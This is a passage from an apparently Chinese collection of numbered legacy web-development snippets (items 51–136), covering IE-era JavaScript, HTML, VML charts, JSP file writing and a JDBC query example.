src=&quot;/upimg/allimg/070404/1451210.gif&quot;&gt;&lt;/a&gt; 51.向文件中写内容 &lt;%@ page import=&quot;java.io.*&quot; %&gt; &lt;% String str = &quot;print me&quot;; //always give the path from root. This way it almost always works. String nameOfTextFile = &quot;/usr/anil/imp.txt&quot;; try &#123; PrintWriter pw = new PrintWriter(new FileOutputStream(nameOfTextFile)); pw.println(str); //clean up pw.close(); &#125; catch(IOException e) &#123; out.println(e.getMessage()); &#125; %&gt; 52.先读文件再写文件 &lt;%@ page language = &quot;java&quot; %&gt; &lt;%@ page contentType = &quot;text/html; charSet=gb2312&quot; %&gt; &lt;%@ page import =&quot;java.util.*&quot; %&gt; &lt;%@ page import =&quot;java.lang.*&quot; %&gt; &lt;%@ page import =&quot;javax.servlet.*&quot; %&gt; &lt;%@ page import =&quot;javax.servlet.jsp.*&quot; %&gt; &lt;%@ page import =&quot;javax.servlet.http.*&quot; %&gt; &lt;%@ page import=&quot;java.io.*&quot; %&gt; eryrytry &lt;% int count=0; FileInputStream fi =new FileInputStream (&quot;count.txt&quot;); ObjectInputStream si= new ObjectInputStream (fi); count =si.readInt(); count++; out.print(count); si.close(); FileOutputStream fo =new FileOutputStream (&quot;count.txt&quot;); ObjectOutputStream so= new ObjectOutputStream (fo); so.writeInt(count); so.close(); %&gt; 53.直线型输入框 &lt;INPUT name=Password size=10 type=password style=&quot;border-left-width: 0; border-right-width: 0; 字串6 border-top-width: 0; border-bottom-style: solid; border-bottom-width: 1; background-color: #9CEB9C&quot;&gt; 54.可以将背景改为按钮性状，通过改变css改变属性 &lt;td width=&quot;65&quot; align=&quot;center&quot; bgcolor=&quot;#E0E0E0&quot; onmouseover=this.className=&#x27;mouseoverbt&#x27;; onmouseout=this.className=&#x27;mouseout&#x27;;&gt;&lt;a href=&quot;tm.asp?classid=76&quot;&gt;&lt;font color=&quot;#000000&quot;&gt;录音笔&lt;/font&gt;&lt;/a&gt;&lt;/td&gt; &lt;style&gt; .mouseoverbt &#123; background-image: url(http://www.yongle.com.cn/img/btbgw64h20y.gif); background-repeat: no-repeat; &#125; .mouseout &#123; background-color: #E0E0E0; &#125; &lt;/style&gt; 55.同时按下CTRL和Q键 document.onkeydown=function() &#123; if(event.ctrlKey&amp;&amp;event.keyCode==81) &#123;alert(1)&#125; &#125;// 56.以下是一个完整的显示hint的代码，其思想是当鼠标停留是将div中的内容显示在鼠标出，当鼠标移出后在将该div隐 藏掉 -------------------------------------------------&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt; &lt;HTML&gt; &lt;style&gt; #hint&#123; width:198px; border:1px solid #000000; background:#99ff33; position:absolute; z-index:9; padding:6px; line-height:17px; text-align:left; top: 1520px; &#125; &lt;/style&gt; &lt;SCRIPT&gt; &lt;!-- function showme() &#123; var oSon=window.document.getElementById(&quot;hint&quot;); if (oSon==null) return; with (oSon) &#123; innerText=guoguo.value; style.display=&quot;block&quot;; style.pixelLeft=window.event.clientX+window.document.body.scrollLeft+6; style.pixelTop=window.event.clientY+window.document.body.scrollTop+9; &#125; &#125; function hidme() &#123; var oSon=window.document.getElementById(&quot;hint&quot;); if (oSon==null) return; oSon.style.display=&quot;none&quot;; &#125; //--&gt; &lt;/SCRIPT&gt; &lt;BODY&gt; &lt;text id=guoguo value=ga &gt; &lt;a href=# onmouseover=showme() onmouseout=hidme() onmousemove=showme() son=hint &gt;dfdfd &lt;/a&gt; &lt;div id=hint style=&quot;display:none&quot;&gt;&lt;/div&gt; &lt;/BODY&gt; &lt;/HTML&gt; -------------------------------------------------57.弹出窗口 方法一：&lt;body onload=&quot;openwen()&quot;&gt; 浏览器读页面时弹出窗口； 方法二：&lt;body onunload=&quot;openwen()&quot;&gt; 浏览器离开页面时弹出窗口； 方法三：用一个连接调用：&lt;a href=&quot;#&quot; onclick=&quot;openwin()&quot;&gt;打开一个窗口&lt;/a&gt; 注意：使用的&quot;#&quot;是虚连接。 方法四：用一个按钮调用：&lt;input type=&quot;button&quot; onclick=&quot;openwin()&quot; value=&quot;打开窗口&quot;&gt; 何时装载script 58.动态改变字体的大小 function doZoom(size) &#123; document.getElementById(&#x27;zoom&#x27;).style.fontSize=size+&#x27;px&#x27; &#125; function aa() &#123; var newWin=window.open(url); newWin.document.form1.text1.value=value1; &#125;改变弹出窗口上域的属性 opener.document.form2.text2.value=value2;改变父窗口的域的值 59.判断是何种浏览器 var name = navigator.appName; if (name == &quot;Microsoft Internet Explorer&quot;) alert(&quot;IE&quot;); else if (name == &quot;Netscape&quot;) alert(&quot;NS&quot;);// 60.vbsscript确定框 &lt;script language=&quot;VBScript&quot;&gt; &lt;!-- MsgBox &quot;确定删除吗？&quot;, 4 //--&gt; &lt;/script&gt;// 61.复制内容到剪切板 function JM_cc(bb) &#123; var ob=eval(&quot;document.form1.&quot;+bb); ob.select(); js=ob.createTextRange(); js.execCommand(&quot;Copy&quot;); &#125;// 62.java中建立数据库连接取数据 public void init() &#123; String url=&quot;jdbc:odbc:javadata&quot;; try &#123; Class.forName(&quot;sun.jdbc.odbc.JdbcOdbcDriver&quot;); Connection con=DriverManager.getConnection(url,&quot;sa&quot;,&quot;&quot;);//mssql database user SA and password DatabaseMetaData dma=con.getMetaData(); System.out.println(&quot;Connect to&quot;+dma.getURL()); System.out.println(&quot;;Driver &quot;+dma.getDriverName()); System.out.println(&quot;;Version &quot;+dma.getDriverVersion()); System.out.println(&quot;&quot;); Statement stmt=con.createStatement(); ResultSet rs=stmt.executeQuery(&quot;select * from company.dbo.TB_NAME where number=1&quot;);//Sql rs.next(); String dispresult=rs.getString(&quot;name&quot;); System.out.println(dispresult);// Instead,you can display it in Paint() or use AWT etc. rs.close(); stmt.close(); con.close(); &#125; catch(SQLException ex) &#123; System.out.println(&quot;!!!SQL Exception !!!&quot;); while(ex!=null) &#123; System.out.println(&quot;SQLState:&quot;+ex.getSQLState()); System.out.println(&quot;Message:&quot;+ex.getMessage()); System.out.println(&quot;Vendor:&quot;+ex.getErrorCode()); ex=ex.getNextException(); System.out.println(&quot;&quot;); &#125; &#125; catch(java.lang.Exception ex) &#123; ex.printStackTrace(); &#125; &#125;// 63.最小化窗口 window.blur()// 64.文档的路径 document.URL// 65.定时执行某段程序 setTimeout(&quot;change_color()&quot;,600); 66.设置为主页 function makeHome()&#123; netscape.security.PrivilegeManager.enablePrivilege(&quot;UniversalPreferencesWrite&quot;); navigator.preference(&quot;browser.startup.homepage&quot;, location.href); &#125;// 67.设置为收藏 function addFav()&#123; if(ie) window.external.AddFavorite(location.href,&#x27;WWW.OGRISH.COM : GROTESQUE MOVIES AND PICTURES&#x27;); if(ns) alert(&quot;Thanks for the bookmark!\\n\\nNetscape users click OK then press CTRL-D&quot;); &#125;// 68.判断cookie是否可用 navigator.cookieEnabled;// 69.显示有模式的有页面的弹出窗口 function setbgcolor_onclick() &#123; var color = showModalDialog(&quot;/mailpage/compose/colorsel.html&quot;,0,&quot;help=0&quot;); if (color != null) &#123; document.compose.bgcolor.value = color; &#125; &#125;// 70.截取小数点后两位 var a=3454545.4454545; alert(a.toFixed(2));// 71.禁止选择页面上的文字来拷贝 &lt;script&gt; function noEffect() &#123; with (event) &#123; returnValue = false; cancelBubble = true; &#125; return; &#125; &lt;/script&gt; &lt;body onselectstart=&quot;noEffect()&quot; oncontextmenu=&quot;noEffect()&quot;&gt;// 72.屏蔽右键菜单 oncontextmenu=&quot;event.returnValue = false&quot;// 73.事件禁止起泡 event.cancelBubble = true// 74.禁止在输入框打开输入法 &lt;input style=&quot;ime-mode: disabled&quot;&gt;// 75.屏蔽汉字和空格 &lt;input name=&quot;txt&quot;&gt;&lt;input type=&quot;submit&quot; onClick=&quot;alert(!/[^ -&#125;]|\\s/.test(txt.value))&quot;&gt;// 76.用javascript判断文件是否存在 function Exists(filespec) &#123; if (filespec) &#123; var fso; fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;); alert(fso.FileExists(filespec)); &#125; &#125; 选择图片 &lt;input type=file name=f1&gt;&lt;p&gt; &lt;input type=&quot;submit&quot; onClick=&quot;Exists(f1.value)&quot;&gt;// 77.获得当前的文本框选中的文字 &lt;input onmouseup=&quot;alert(document.selection.createRange().text)&quot; value=123&gt;// 78.跳转至目标页面，同时不可返回 &lt;a href=&quot;javascript:location.replace(&#x27;http://www.sohu.com/&#x27;)&quot;&gt;sohu.com&lt;/a&gt;// 79.获得当前的行是表格的第几行 &lt;script&gt; function getrow(obj) &#123; if(event.srcElement.tagName==&quot;TD&quot;)&#123; curRow=event.srcElement.parentElement; alert(&quot;这是第&quot;+(curRow.rowIndex+1)+&quot;行&quot;); &#125; &#125; &lt;/script&gt; &lt;table border=&quot;1&quot; width=&quot;100%&quot; onclick=getrow(this)&gt; &lt;tr&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;td width=&quot;20%&quot;&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;// 80.删除表格某行，xx表示某行，下标从0开始计算 document.all.myTable.deleteRow(xx)// 81.动态的向表格中添加行 &lt;table id=&quot;t1&quot; border=&quot;1&quot;&gt; &lt;/table&gt; &lt;script&gt; function add() &#123; t1.insertRow().insertCell().innerHTML = &#x27;&lt;input name=&quot;test&#x27;+t1.rows.length+&#x27;&quot;&gt;&#x27;; &#125;//82.event.x,event.clientX,event.offsetX区别： x:设置或者是得到鼠标相对于目标事件的父元素的外边界在x坐标上的位置。 clientX:相对于客户区域的x坐标位置，不包括滚动条，就是正文区域。 offsetx：设置或者是得到鼠标相对于目标事件的父元素的内边界在x坐标上的位置。 screenX:相对于用户屏幕。 83.显示是鼠标按钮的哪个 &lt;body onMouseDown=&quot;alert(event.button)&quot;&gt;点Mouse看看// 84.打开C盘 &lt;form action=&quot;file:///c|/&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;c:\\ drive&quot;&gt;&lt;/form&gt;// 85.当前屏幕的分辨率 screen.width、screen.height// 86.设置表格中的内容 tbl.rows[0].cells[1].innerText=document.form.text1.value;// 87.本地快捷键 &lt;p&gt;&lt;a href=&quot;file:///::&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;&quot; target=&quot;_blank&quot;&gt;网上邻居&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;file:///::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;\\d:\\web&quot; target=&quot;_blank&quot;&gt;我的电脑&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;file:///::&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125;&quot; target=&quot;_blank&quot;&gt;我的文档&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;file:///::&#123;645FF040-5081-101B-9F08-00AA002F954E&#125;&quot; target=&quot;_blank&quot;&gt;回收站&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;file:///::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;\\::&#123;21EC2020-3AEA-1069-A2DD-08002B30309D&#125;&quot; target=&quot;_blank&quot;&gt;控制面板&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;file:///::&#123;7007ACC7-3202-11D1-AAD2-00805FC1270E&#125;&quot;&gt;拨号网络&lt;/a&gt;(windows 2000)&lt;/p&gt; 88.IE菜单 &lt;button onclick=&quot;min.Click()&quot;&gt;&lt;font face=&quot;webdings&quot;&gt;0&lt;/font&gt;&lt;/button&gt;//改变按钮上的图片 &lt;input type=button onclick=&quot;document.execCommand(&#x27;CreateLink&#x27;,&#x27;true&#x27;,&#x27;true&#x27;)&quot;&gt; //创建新连接 &lt;input type=button onclick=&quot;document.execCommand(&#x27;print&#x27;,&#x27;true&#x27;,&#x27;true&#x27;)&quot;&gt; //打印 &lt;input type=button onclick=&quot;document.execCommand(&#x27;saveas&#x27;,&#x27;true&#x27;,&#x27;网站制作.htm&#x27;)&quot;&gt;//另存为htm &lt;input type=button onclick=&quot;document.execCommand(&#x27;saveas&#x27;,&#x27;true&#x27;,&#x27;网站制作.txt&#x27;)&quot;&gt;//另存为txt document.execCommand(&quot;SaveAs&quot;)//保存为 document.execCommand(&#x27;undo&#x27;)//撤销上一次操作 89.web对话框 &lt;SCRIPT&gt; var contents=&#x27;&lt;style&gt;body,td&#123;font:menu&#125;img&#123;cursor:hand&#125;&lt;/style&gt;&#x27;; contents+=&#x27;&lt;title&gt;你要关闭我吗&lt;/title&gt;&#x27;; contents+=&#x27;&lt;body bgcolor=menu&gt;&#x27;; contents+=&#x27;&lt;table width=100% height=100% border=0&gt;&#x27;; contents+=&#x27;&lt;tr&gt;&lt;td align=center&gt;&#x27;; contents+=&#x27;你要关闭我吗？&lt;br&gt;&#x27;; contents+=&#x27;&lt;img src=dark.gif onclick=self.close() alt=&quot;...关闭&quot;&gt;&#x27;; contents+=&#x27;&lt;img src=jet.gif onclick=self.close() alt=&quot;全是关闭&quot;&gt;&#x27;; contents+=&#x27;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#x27;; showModalDialog(&quot;about:&quot;+contents+&quot;&quot;,&quot;&quot;,&quot;dialogHeight:50px;dialogWidth:250px;help:no;status:no&quot;) document.write(contents); &lt;/SCRIPT&gt;// 90.取第x,y的值 &lt;button onclick=&quot;t1.rows[x].cells[y].innerText=&#x27;guoguo&#x27;&quot;&gt;&lt;/button&gt;// 91.向新打开的网页上写内容 newwin=window.open(&#x27;about:blank&#x27;,&#x27;&#x27;,&#x27;top=10&#x27;); newwin.document.write(&#x27;&#x27;);// 93.返回 javascript:history.go(-2);// 94.将页面上选中的内容复制到剪贴板 abcdefg &lt;input type=&#x27;button&#x27; onclick=&quot;window.clipboardData.setData(&#x27;text&#x27;,document.selection.createRange().text);&quot; value=&#x27;复制页面选中的字符&#x27;&gt;// 95.将页面上选中的内容复制到剪贴板 &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;&quot;&gt;kjhkjhkhkj&lt;INPUT TYPE=&quot;button&quot; onclick=&quot;document.execCommand(&#x27;Copy&#x27;, &#x27;false&#x27;, null);&quot;&gt;//// 96.鼠标移到下拉框时自动全部打开 &lt;select onmouseover=&quot;javascript:this.size=this.length&quot; onmouseout=&quot;javascript:this.size=1&quot;&gt;&lt;/select&gt;// 97.获得本机的文件 var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;); var f1 = fso.GetFile(&quot;C:\\\\bsitcdata\\\\ejbhome.xml&quot;); alert(&quot;File last modified: &quot; + f1.DateLastModified); // 98.判断客户端是否是IE浏览器 因为 document.all 是 IE 的特有属性，所以通常用这个方法来判断客户端是否是IE浏览器 ,document.all?1:0; 99.创建新的下拉框选项 new Option(text,value)这样的函数// 100.在页面上画柱状图 &lt;STYLE&gt; td&#123;font-size:12px&#125; body&#123;font-size:12px&#125; v\\:*&#123;behavior:url(#default#VML);&#125; //这里声明了v作为VML公用变量 &lt;/STYLE&gt; &lt;SCRIPT&gt; mathstr=12; document.write (&quot;&lt;v:rect fillcolor=&#x27;red&#x27; style=&#x27;width:20;color:navy;height:&quot;+5000/(1000/mathstr)+&quot;&#x27;&gt;&lt;br&gt;&amp;nbsp;%&quot;+mathstr+&quot;&lt;br&gt;4人&lt;v:Extrusion backdepth=&#x27;15pt&#x27; on=&#x27;true&#x27;/&gt;&lt;/v:rect&gt;&quot;) &lt;/SCRIPT&gt; &lt;v:rect fillcolor=&#x27;red&#x27; style=&#x27;width:20;color:navy;height:200&#x27;&gt;&lt;br&gt;%12&lt;br&gt;4人&lt;v:Extrusion backdepth=&#x27;15pt&#x27; on=&#x27;true&#x27;/&gt;&lt;/v:rect&gt; &lt;v:rect fillcolor=&#x27;yellow&#x27; style=&#x27;width:20;color:navy;height:100&#x27;&gt;&lt;br&gt;%12&lt;br&gt;4人&lt;v:Extrusion backdepth=&#x27;15pt&#x27; on=&#x27;true&#x27;/&gt;&lt;/v:rect&gt;// 101.饼图 &lt;style&gt; v\\:* &#123; behavior: url(#default#VML) &#125; o\\:* &#123; behavior: url(#default#VML) &#125; .shape &#123; behavior: url(#default#VML) &#125; &lt;/style&gt; &lt;script&gt; function show(pie) &#123; pie.strokecolor=pie.fillcolor; pie.strokeweight=10; div1.innerHTML=&quot;&lt;font size=2 color=red&gt; &quot; + pie.id +&quot;&lt;/font&gt; &lt;font size=2&gt;&quot; + pie.title + &quot;&lt;/font&gt;&quot;; &#125; function hide(pie) &#123; pie.strokecolor=&quot;white&quot;; pie.strokeweight=1; div1.innerHTML=&quot;&quot;; &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;v:group style=&#x27;width: 5cm; height: 5cm&#x27; coordorigin=&#x27;0,0&#x27; coordsize=&#x27;250,250&#x27;&gt; &lt;v:shape id=&#x27;asp技术&#x27; style=&#x27;width:10;height:10;top:10;left:0&#x27; title=&#x27;得票数:6 比例:40.00%&#x27; onmouseover=&#x27;javascript:show(this);&#x27; onmouseout=&#x27;javascript:hide(this);&#x27; href=&#x27;http://www.cnADO.com&#x27; CoordSize=&#x27;10,10&#x27; strokecolor=&#x27;white&#x27; fillcolor=&#x27;#ffff33&#x27;&gt;&lt;v:path v=&#x27;m 300,200 ae 300,200,200,150,0,9437184 xe&#x27;/&gt;&lt;/v:shape&gt; &lt;v:shape id=&#x27;php&#x27; style=&#x27;width:10;height:10;top:10;left:0&#x27; title=&#x27;得票数:1 比例:6.67%&#x27; onmouseover=&#x27;javascript:show(this);&#x27; onmouseout=&#x27;javascript:hide(this);&#x27; href=&#x27;http://www.cnADO.com&#x27; CoordSize=&#x27;10,10&#x27; strokecolor=&#x27;white&#x27; fillcolor=&#x27;#ff9933&#x27;&gt;&lt;v:path v=&#x27;m 300,200 ae 300,200,200,150,9437184,1572864 xe&#x27;/&gt;&lt;/v:shape&gt; &lt;v:shape id=&#x27;jsp&#x27; style=&#x27;width:10;height:10;top:10;left:0&#x27; title=&#x27;得票数:2 比例:13.33%&#x27; onmouseover=&#x27;javascript:show(this);&#x27; onmouseout=&#x27;javascript:hide(this);&#x27; href=&#x27;http://www.cnADO.com&#x27; CoordSize=&#x27;10,10&#x27; strokecolor=&#x27;white&#x27; fillcolor=&#x27;#3399ff&#x27;&gt;&lt;v:path v=&#x27;m 300,200 ae 300,200,200,150,11010048,3145728 xe&#x27;/&gt;&lt;/v:shape&gt; &lt;v:shape id=&#x27;c#写的.netWEB程序&#x27; style=&#x27;width:10;height:10;top:10;left:0&#x27; title=&#x27;得票数:3 比例:20.00%&#x27; onmouseover=&#x27;javascript:show(this);&#x27; onmouseout=&#x27;javascript:hide(this);&#x27; href=&#x27;http://www.cnADO.com&#x27; CoordSize=&#x27;10,10&#x27; strokecolor=&#x27;white&#x27; fillcolor=&#x27;#99ff33&#x27;&gt;&lt;v:path v=&#x27;m 300,200 ae 300,200,200,150,14155776,4718592 xe&#x27;/&gt;&lt;/v:shape&gt; &lt;v:shape id=&#x27;vb.net写的.netWEB程序&#x27; style=&#x27;width:10;height:10;top:10;left:0&#x27; title=&#x27;得票数:2 比例:13.33%&#x27; onmouseover=&#x27;javascript:show(this);&#x27; onmouseout=&#x27;javascript:hide(this);&#x27; href=&#x27;http://www.cnADO.com&#x27; CoordSize=&#x27;10,10&#x27; strokecolor=&#x27;white&#x27; fillcolor=&#x27;#ff6600&#x27;&gt;&lt;v:path v=&#x27;m 300,200 ae 300,200,200,150,18874368,3145728 xe&#x27;/&gt;&lt;/v:shape&gt; &lt;v:shape id=&#x27;xml技术&#x27; style=&#x27;width:10;height:10;top:10;left:0&#x27; title=&#x27;得票数:1 比例:6.67%&#x27; onmouseover=&#x27;javascript:show(this);&#x27; onmouseout=&#x27;javascript:hide(this);&#x27; href=&#x27;http://www.cnADO.com&#x27; CoordSize=&#x27;10,10&#x27; strokecolor=&#x27;white&#x27; fillcolor=&#x27;#ff99ff&#x27;&gt;&lt;v:path v=&#x27;m 300,200 ae 300,200,200,150,22020096,1572864 xe&#x27;/&gt;&lt;/v:shape&gt; &lt;/v:group&gt; &lt;v:group style=&#x27;width: 6cm; height: 6cm&#x27; coordorigin=&#x27;0,0&#x27; coordsize=&#x27;250,250&#x27;&gt; &lt;v:rect style=&#x27;height:10;width:15;top:0;left:10&#x27; fillcolor=&#x27;#ffff33&#x27;/&gt; &lt;v:rect style=&#x27;height:28;width:100;top:0;left:30&#x27; stroked=&#x27;false&#x27;&gt;&lt;v:textbox style=&#x27;fontsize:2&#x27;&gt;asp技术&lt;/v:textbox/&gt;&lt;/v:rect&gt; &lt;v:rect style=&#x27;height:10;width:15;top:30;left:10&#x27; fillcolor=&#x27;#ff9933&#x27;/&gt; &lt;v:rect style=&#x27;height:28;width:100;top:30;left:30&#x27; stroked=&#x27;false&#x27;&gt;&lt;v:textbox style=&#x27;fontsize:2&#x27;&gt;php&lt;/v:textbox/&gt;&lt;/v:rect&gt; &lt;v:rect style=&#x27;height:10;width:15;top:60;left:10&#x27; fillcolor=&#x27;#3399ff&#x27;/&gt; &lt;v:rect style=&#x27;height:28;width:100;top:60;left:30&#x27; stroked=&#x27;false&#x27;&gt;&lt;v:textbox style=&#x27;fontsize:2&#x27;&gt;jsp&lt;/v:textbox/&gt;&lt;/v:rect&gt; &lt;v:rect style=&#x27;height:10;width:15;top:90;left:10&#x27; fillcolor=&#x27;#99ff33&#x27;/&gt; &lt;v:rect style=&#x27;height:28;width:100;top:90;left:30&#x27; stroked=&#x27;false&#x27;&gt;&lt;v:textbox style=&#x27;fontsize:2&#x27;&gt;c#写的.netWEB程序&lt;/v:textbox/&gt;&lt;/v:rect&gt; &lt;v:rect style=&#x27;height:10;width:15;top:120;left:10&#x27; fillcolor=&#x27;#ff6600&#x27;/&gt; &lt;v:rect style=&#x27;height:28;width:100;top:120;left:30&#x27; stroked=&#x27;false&#x27;&gt;&lt;v:textbox style=&#x27;fontsize:2&#x27;&gt;vb.net 写的.netWEB程序&lt;/v:textbox/&gt;&lt;/v:rect&gt; &lt;v:rect style=&#x27;height:10;width:15;top:150;left:10&#x27; fillcolor=&#x27;#ff99ff&#x27;/&gt; &lt;v:rect style=&#x27;height:28;width:100;top:150;left:30&#x27; stroked=&#x27;false&#x27;&gt;&lt;v:textbox style=&#x27;fontsize:2&#x27;&gt;xml技术 &lt;/v:textbox/&gt;&lt;/v:rect&gt; &lt;/v:group&gt; &lt;div style=&quot;position: absolute; left: 10; top: 10; width: 760; height:16&quot;&gt; &lt;table border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;2&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;style=&quot;border-collapse: collapse&quot; bordercolor=&quot;#CCCCCC&quot; width=&quot;100%&quot; ID=&quot;Table1&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100%&quot; id=div1 &gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;// 102.是一个特殊的容器，想装个网页都行 &lt;button&gt;&lt;iframe src=&quot;http://www.google.com/&quot;&gt;&lt;/iframe&gt;&lt;/button&gt;//button 103.外部的html代码 event.srcElement.outerHTML// 104.标识当前的IE事件的触发器 event.srcElement和event.keyCode// 105.事件类型 event.type// 106.动态改变类型 &lt;style&gt; .Overnone &#123; border-width:0;background-color:darkblue;cursor:default;color:gold;width:115&#125; .Outnone &#123;border-width:0;background-color:white;cursor:default;width:115&#125; &lt;/style&gt; &lt;input class=Outnone onmouseover=this.className=&#x27;Overnone&#x27; &gt;// 107.页面翻转 &lt;html dir=rtl &gt;&lt;/html&gt;// 108.滚屏 parent.scroll(x,y);// &lt;body onload=&quot;s=0&quot; onDblClick=&quot;s=setInterval(&#x27;scrollBy(0, 1)&#x27;,10)&quot; onClick=&quot;clearInterval(s)&quot;&gt;// 109.改变状态栏 self.status =&quot;&quot;;// 110.改变窗口大小 window.resizeTo(200,300);// 111.改变鼠标样式 style BODY&#123;CURSOR: url(&#x27;mouse.ani&#x27;); SCROLLBAR-BASE-COLOR: #506AA8; SCROLLBAR-ARROW-COLOR: #14213F; &#125;// 112.背景透明 &lt;input type=&quot;button&quot; value=&quot;Button&quot; style=&quot;background-color: transparent; border: 0;&quot;&gt;// 113.鼠标为等待形状 &lt;input type=button onclick=&quot;this.style.cursor=&#x27;wait&#x27;&quot;&gt;// 114.调用父窗口的函数 opener.fucntion1();// 115.body的内部html代码 &lt;input type=&quot;button&quot; onclick=&quot;alert(code.document.body.innerHTML)&quot; value=&quot;查看&quot;&gt;// 116.框架中调用父窗口的函数 &lt;INPUT TYPE=&#x27;button&#x27; onclick=&#x27;parent.test();&#x27; value=&#x27;调用parent窗口的函数&#x27;&gt;// 117.交换节点 &lt;table width=200 height=200 border&gt; &lt;tr&gt;&lt;td id=c1&gt;CELL_1&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td id=c2&gt;CELL_2&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;br&gt; &lt;input type=&quot;button&quot; value=&quot;swap row&quot; onclick=&quot;c1.swapNode(c2)&quot;&gt;// 118.删除节点 &lt;table width=200 height=200 border&gt; &lt;tr id=trall&gt;&lt;td id=c1&gt;CELL_1&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td id=c2&gt;CELL_2&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;br&gt; &lt;input type=&quot;button&quot; value=&quot;swap row&quot; onclick=&quot;trall.removeNode(c2)&quot;&gt;// 119.添加节点 addNode()// 120.获得事件的父与子标签 event.srcElement.children[0]和event.srcElement.parentElement // 121.集中为按钮改变颜色 &lt;style&gt; button&#123;benc:expression(this.onfocus = function()&#123;this.style.backgroundColor=&#x27;#E5F0FF&#x27;;&#125;)&#125; &lt;/style&gt; &lt;button&gt;New&lt;/button&gt;// 122.判断是左键还是右键被按下 &lt;body onmousedown=if(event.button==1) alert(&quot;左键&quot;);if(event.button==2)alert(&quot;右键&quot;) &gt;// 123.获得操作系统的名称和浏览器的名称 document.write(navigator.userAgent)// 124.alt/ctrl/shift键按下 event.altKey //按下alt键 event.ctrlKey //按下ctrl键 event.shiftKey //按下shift键 125.将当前位置定位为C盘。 &#123;window.location=&quot;c:&quot;&#125;// 126.返回输入框的类型 &lt;script&gt; alert(event.srcElement.type);// &lt;/script&gt; 127.模拟控件的单击事件 &lt;INPUT TYPE=&quot;hidden&quot; name=&quot;guoguo&quot; onclick=&quot;haha()&quot;&gt; &lt;SCRIPT&gt; &lt;!-- function haha() &#123; alert(); &#125; guoguo.click(); //--&gt; &lt;/SCRIPT&gt;// 128.取出记录集的列名 java.sql.ResultSet rset = com.bsitc.util.DBAssist.getIT().executeQuery(queryStatement, conn); java.sql.ResultSetMetaData metaData = rset.getMetaData(); int count = metaData.getColumnCount(); String name = metaData.getColumnName(i); String value = rset.getString(i);// 129.格式化数字 function format_number(str,digit) &#123; if(isNaN(str)) &#123; alert(&quot;您传入的值不是数字！&quot;); return 0; &#125; else if(Math.round(digit)!=digit) &#123; alert(&quot;您输入的小数位数不是整数！&quot;); return 0; &#125; else return Math.round(parseFloat(str)*Math.pow(10,digit))/Math.pow(10,digit); &#125; 130.回车按钮转化为tab按钮 if(event.keyCode==13) event.keyCode=9; //将 131.滚动条滚动 &lt;button onclick=&quot;text1.scrollTop=text1.scrollHeight&quot;&gt;Scroll&lt;/button&gt;&lt;br&gt; &lt;textarea id=&quot;text1&quot; cols=50 rows=10 &gt; 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 &lt;/textarea&gt;// 132.判断是什么对象 if(typeof(unknown)==&quot;function&quot;)return true; if(typeof(unknown)!=&quot;object&quot;)return false;// 133.取消文本框自动完成功能 &lt;input type=&quot;text&quot; autocomplete=&quot;off&quot;&gt; // 134.让下拉框自动下拉 &lt;select onmouseover=&quot;javascript:this.size=this.length&quot; onmouseout=&quot;javascript:this.size=1&quot;&gt; &lt;option value=&quot;&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;&quot;&gt;3&lt;/option&gt; &lt;/select&gt; // 135.读取XML文件 var childrenobj=myselect//document.all.myselect; var oXMLDoc = new ActiveXObject(&#x27;MSXML&#x27;); oXMLDoc.url = &quot;mymsg.xml&quot;; var oRoot=oXMLDoc.root; if(oRoot.children != null) &#123; for(var i=0;i&lt;oRoot.children.item(0).children.length;++i) &#123; oItem = oRoot.children.item(0).children.item(i); oOption = new Option(oItem.text,oItem.value); childrenobj.add(oOption); &#125; &#125; //mymsg.xml文件 &lt;?xml version=&quot;1.0&quot; encoding=&quot;gb2312&quot; ?&gt; &lt;childrenlist&gt; &lt;aa&gt; &lt;child value=&#x27;3301&#x27;&gt;杭州地区&lt;/child&gt; 字串5 &lt;child value=&#x27;3303&#x27;&gt;温州地区&lt;/child&gt; &lt;/aa&gt; &lt;aa&gt; &lt;child value=&#x27;3310&#x27;&gt;台州地区&lt;/child&gt; &lt;child value=&#x27;3311&#x27;&gt;丽水地区&lt;/child&gt; &lt;/aa&gt; &lt;/childrenlist&gt;// 136.点击图片，图片停止 &lt;a href=&quot;javascript:&quot;&gt;&lt;img 